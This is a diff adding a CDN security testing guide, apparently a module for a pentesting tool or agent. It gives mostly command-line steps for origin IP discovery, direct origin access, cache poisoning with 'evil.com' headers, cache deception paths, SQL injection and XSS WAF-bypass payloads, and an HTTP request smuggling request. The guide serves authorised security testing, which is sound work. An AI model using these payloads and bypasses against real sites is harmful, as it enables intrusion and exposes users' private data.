@@ -1,0 +1,413 @@
+<cdn_security_guide>
+<title>CDN SECURITY TESTING</title>
+
+<critical>Content Delivery Network (CDN) security testing focuses on origin server discovery, cache manipulation, CDN bypass techniques, and WAF evasion. Weak CDN configuration can expose origin servers to direct attacks, enable cache poisoning, and allow WAF bypass leading to exploitation of backend vulnerabilities.</critical>
+
+<scope>
+- Origin IP discovery and direct access
+- CDN bypass techniques
+- Cache key manipulation and poisoning
+- Edge configuration exposure
+- Provider-specific vulnerabilities (Cloudflare, Akamai, Fastly)
+- Origin authentication bypass
+- WAF bypass via CDN exploitation
+- Cache deception attacks
+- HTTP request smuggling via CDN
+</scope>
+
+<methodology>
+1. Identify CDN provider and configuration.
+2. Attempt origin IP discovery using multiple techniques.
+3. Test for cache key manipulation vulnerabilities.
+4. Analyze edge caching behavior and rules.
+5. Test CDN-specific security features and bypasses.
+6. Attempt direct origin access bypassing CDN/WAF.
+7. Test for HTTP request smuggling and cache poisoning.
+</methodology>
+
+<origin_discovery>
+<ip_enumeration>
+{% raw %}
+# Discover origin server IP:
+
+# 1. Historical DNS records:
+# SecurityTrails, ViewDNS.info
+curl "https://securitytrails.com/domain/example.com/history/a"
+
+# 2. Subdomain enumeration:
+# Find subdomains not behind CDN
+subfinder -d example.com
+amass enum -d example.com
+
+# Check each subdomain:
+dig subdomain.example.com +short
+# Compare with main domain
+
+# 3. SSL certificates:
+# Certificate Transparency logs
+curl "https://crt.sh/?q=%.example.com&output=json"
+# Extract IP addresses from certificates
+
+# 4. Mail server records:
+dig example.com MX +short
+dig mail.example.com +short
+# Mail servers often on origin network
+
+# 5. Direct IP scan:
+# Scan IP ranges of hosting provider
+nmap -p 443 --open 203.0.113.0/24
+
+# Check SSL certificate on each IP:
+for ip in $(seq 1 254); do
+  echo | openssl s_client -connect 203.0.113.$ip:443 -servername example.com 2>/dev/null | grep "subject="
+done
+
+# 6. Favicon hash:
+# Unique favicon can identify origin
+curl -s https://example.com/favicon.ico | md5sum
+# Search Shodan for same hash
+
+# 7. DNS history:
+host -t A example.com
+# Check archives, old DNS records
+{% endraw %}
+</ip_enumeration>
+
+<direct_origin_access>
+{% raw %}
+# Test direct access to origin:
+
+# Once origin IP found:
+# Method 1: Direct connection
+curl -H "Host: example.com" http://203.0.113.10/
+
+# Method 2: Bypass via /etc/hosts
+echo "203.0.113.10 example.com" >> /etc/hosts
+curl https://example.com/
+
+# Method 3: HTTP/1.0 request (may bypass CDN):
+printf "GET / HTTP/1.0\r\nHost: example.com\r\n\r\n" | nc 203.0.113.10 80
+
+# Test if origin protected:
+# Should reject requests without CDN headers
+# Should validate IP/secret from CDN
+
+# Check for origin authentication:
+# CloudFront: X-Origin-Verify
+# Akamai: Akamai-Origin-Hop
+# Fastly: Fastly-Client-IP
+
+# If direct access works:
+# Origin exposed, can bypass WAF/rate limits
+{% endraw %}
+</direct_origin_access>
+</origin_discovery>
+
+<cache_manipulation>
+<cache_key_analysis>
+{% raw %}
+# Analyze cache key composition:
+
+# Cache key typically includes:
+# - Host header
+# - URL path
+# - Query parameters (selective)
+# - Sometimes: Headers, cookies
+
+# Test cache behavior:
+# Request 1:
+curl https://example.com/page?a=1
+# Request 2:
+curl https://example.com/page?a=1
+# Should be cached (same response)
+
+# Request 3:
+curl https://example.com/page?a=2
+# Different cache key
+
+# Test which parameters affect cache:
+curl https://example.com/page?utm_source=test
+curl https://example.com/page?debug=true
+curl https://example.com/page?callback=evil
+
+# Check cache headers:
+X-Cache: HIT
+X-Cache: MISS
+Age: 3600
+Cache-Control: max-age=86400
+
+# Identify cache key components:
+# Vary header indicates what's included
+Vary: Accept-Encoding, Cookie
+{% endraw %}
+</cache_key_analysis>
+
+<cache_poisoning>
+{% raw %}
+# Web cache poisoning:
+
+# Goal: Inject malicious content into cache
+# Served to all users
+
+# Attack 1: Unkeyed header injection
+# If Host header not in cache key:
+curl -H "Host: evil.com" https://example.com/page
+# Response cached with evil.com references
+
+# Attack 2: X-Forwarded-Host injection:
+curl -H "X-Forwarded-Host: evil.com" https://example.com/
+# If reflected in response and cached
+
+# Attack 3: Parameter pollution:
+curl "https://example.com/search?q=test&q=<script>alert(1)</script>"
+# Second parameter may not be in cache key
+
+# Attack 4: Header-based XSS:
+curl -H "X-Original-URL: /xss" https://example.com/
+# If header reflected in cached response
+
+# Verify poisoning:
+# 1. Send malicious request
+# 2. Clear local cache
+# 3. Request normally
+# 4. Check if malicious content served
+{% endraw %}
+</cache_poisoning>
+
+<cache_deception>
+{% raw %}
+# Cache deception attack:
+
+# Trick CDN into caching private data
+# Serve it to other users
+
+# Example:
+# User visits:
+https://example.com/profile.php/style.css
+# CDN sees .css extension, caches response
+# But origin serves /profile.php (private data)
+
+# Test:
+curl https://example.com/account/settings/static.js
+# If private data cached
+
+# Path confusion:
+https://example.com/private/data;.css
+https://example.com/user/profile%00.jpg
+https://example.com/api/token$$.js
+
+# Check if cached:
+curl -I https://example.com/private/data;.css
+# Look for X-Cache: HIT
+
+# Access from different user:
+# Should not see cached private data
+{% endraw %}
+</cache_deception>
+</cache_manipulation>
+
+<provider_specific>
+<cloudflare_attacks>
+{% raw %}
+# Cloudflare-specific testing:
+
+# 1. Origin IP discovery:
+# Check for CF-RAY header
+curl -I https://example.com/ | grep CF-RAY
+
+# Historical DNS:
+# Before Cloudflare was enabled
+
+# MX records may reveal origin network
+
+# 2. Rate limit bypass:
+# Cloudflare has rate limits
+# Direct origin access bypasses
+
+# 3. WAF bypass:
+# Test payloads against Cloudflare WAF
+curl "https://example.com/?id=1' OR '1'='1"
+# Try obfuscation
+
+# 4. Cloudflare Workers exploit:
+# If site uses Workers
+# Check for worker scripts
+curl https://example.com/ -H "Accept: application/json"
+
+# 5. SSL/TLS mode:
+# Flexible SSL = no encryption to origin
+# If origin on HTTP, intercept traffic
+
+# 6. Authenticated Origin Pulls:
+# Check if origin validates CF certificate
+curl -k --resolve example.com:443:203.0.113.10 https://example.com/
+{% endraw %}
+</cloudflare_attacks>
+
+<akamai_attacks>
+{% raw %}
+# Akamai-specific testing:
+
+# 1. Identify Akamai:
+curl -I https://example.com/ | grep "Server: AkamaiGHost"
+
+# 2. Edge Server enumeration:
+# Akamai uses edge servers
+dig example.com
+# Multiple IPs = edge servers
+
+# 3. Debug headers:
+curl -H "Pragma: akamai-x-cache-on" https://example.com/
+curl -H "Pragma: akamai-x-get-request-id" https://example.com/
+# May expose internal info
+
+# 4. True-Client-IP injection:
+curl -H "True-Client-IP: 127.0.0.1" https://example.com/
+# Test IP-based access controls
+
+# 5. Origin discovery via subdomains:
+# Non-cached subdomains may reveal origin
+dig origin.example.com
+dig admin.example.com
+{% endraw %}
+</akamai_attacks>
+
+<fastly_attacks>
+{% raw %}
+# Fastly-specific testing:
+
+# 1. Identify Fastly:
+curl -I https://example.com/ | grep "Fastly"
+dig example.com
+# Look for fastly.net in CNAME
+
+# 2. Purge requests:
+# Fastly allows cache purging
+curl -X PURGE https://example.com/page
+# May require Fastly-Key header
+
+# 3. Fastly-Debug header:
+curl -H "Fastly-Debug: 1" https://example.com/
+# May expose VCL configuration
+
+# 4. Shielding bypass:
+# Fastly uses shield POPs
+# Direct POP access may bypass protections
+
+# 5. VCL injection:
+# If VCL configuration exposed
+# Look for custom logic vulnerabilities
+{% endraw %}
+</fastly_attacks>
+</provider_specific>
+
+<waf_bypass>
+<cdn_waf_evasion>
+{% raw %}
+# Bypass WAF using CDN features:
+
+# 1. Direct origin access:
+# If origin IP known and unprotected
+curl -H "Host: example.com" http://origin-ip/
+
+# 2. HTTP/1.0 downgrade:
+# Some WAFs only inspect HTTP/1.1
+printf "GET /?id=1' OR '1'='1 HTTP/1.0\r\n\r\n" | nc example.com 80
+
+# 3. HTTP request smuggling:
+# Desync between CDN and origin
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+
+# 4. Cache key exclusion:
+# Parameter not in cache key bypasses inspection
+curl "https://example.com/?tracked=safe&untracked=<script>alert(1)</script>"
+
+# 5. Header injection:
+curl -H "X-Original-URL: /admin" https://example.com/
+# If CDN forwards header without inspection
+
+# 6. HTTP method override:
+curl -X POST https://example.com/ -H "X-HTTP-Method-Override: DELETE"
+# May bypass method-based WAF rules
+{% endraw %}
+</cdn_waf_evasion>
+</waf_bypass>
+
+<common_payloads>
+{% raw %}
+# Origin discovery:
+dig example.com +short
+curl "https://crt.sh/?q=%.example.com&output=json"
+shodan search "ssl:example.com"
+
+# Direct origin access:
+curl -H "Host: example.com" http://203.0.113.10/
+curl --resolve example.com:443:203.0.113.10 https://example.com/
+
+# Cache poisoning:
+curl -H "X-Forwarded-Host: evil.com" https://example.com/
+curl -H "X-Original-URL: /evil" https://example.com/
+
+# Cache deception:
+https://example.com/profile/settings.css
+https://example.com/api/token;.js
+
+# WAF bypass:
+curl "https://example.com/?id=1' OR '1'='1" --resolve example.com:443:origin-ip
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate origin IP discovery and direct access.
+2. Show successful cache poisoning affecting other users.
+3. Prove CDN configuration allows WAF bypass.
+4. Document cache deception exposing private data.
+5. Show lack of origin authentication allowing direct access.
+6. Demonstrate HTTP request smuggling via CDN.
+7. Prove provider-specific vulnerability exploitation.
+</validation>
+
+<false_positives>
+- Origin IP hidden and properly authenticated
+- Cache keys properly configured including all relevant parameters
+- Origin validates CDN-specific headers/certificates
+- WAF rules applied at both CDN and origin
+- Proper cache control headers preventing sensitive data caching
+- HTTP/2 or HTTP/3 preventing request smuggling
+- Rate limiting at both CDN and origin
+</false_positives>
+
+<impact>
+- Direct access to origin bypassing CDN protections
+- WAF bypass enabling exploitation of backend vulnerabilities
+- Cache poisoning affecting all users (XSS, redirection)
+- Cache deception exposing private user data
+- DDoS attacks directly on origin server
+- Rate limit bypass enabling brute force attacks
+- Access control bypass via header injection
+- Session hijacking via cache poisoning
+</impact>
+
+<pro_tips>
+1. Use multiple techniques for origin IP discovery (DNS history, certificates, subdomains).
+2. Test direct origin access with proper Host header.
+3. Analyze cache behavior to understand cache key composition.
+4. Test for cache poisoning with unkeyed headers (X-Forwarded-Host, X-Original-URL).
+5. Try cache deception with path confusion techniques.
+6. Check provider-specific debug headers and features.
+7. Test HTTP request smuggling between CDN and origin.
+8. Verify origin validates CDN identity (certificates, shared secrets).
+9. Check if sensitive data is cached inappropriately.
+10. Test WAF rules at origin, not just at CDN edge.
+</pro_tips>
+
+<remember>CDN security depends on: hiding origin IP, authenticating CDN at origin, proper cache key configuration, and applying security controls at both CDN edge and origin. Common issues: exposed origin IP allowing direct access and WAF bypass, cache poisoning via unkeyed headers, cache deception with path confusion, HTTP request smuggling due to parsing differences. Test provider-specific features: Cloudflare debug headers, Akamai pragma headers, Fastly VCL configuration. Always verify origin independently validates requests came through CDN.</remember>
+</cdn_security_guide>
